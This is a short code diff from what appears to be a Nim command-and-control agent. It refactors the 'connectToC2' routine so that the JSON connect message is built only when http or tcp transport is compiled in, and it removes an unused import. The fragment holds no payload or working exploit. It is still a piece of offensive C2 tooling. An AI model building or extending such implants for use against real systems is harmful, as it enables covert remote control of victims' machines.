@@ -1,4 +1,4 @@
-import std/[base64, json, os]
+import std/[base64, json]
 
 when defined(tcp):
   import std/net
@@ -8,12 +8,13 @@ elif defined(http):
 import types
 
 proc connectToC2*(app: App) =
-  let j = %*{
-    "task": "connect",
-    "taskId": -1,
-    "error": "",
-    "data": {}
-  }
+  when defined(http) or defined(tcp):
+    let j = %*{
+      "task": "connect",
+      "taskId": -1,
+      "error": "",
+      "data": {}
+    }
 
   when defined(http):
     try:
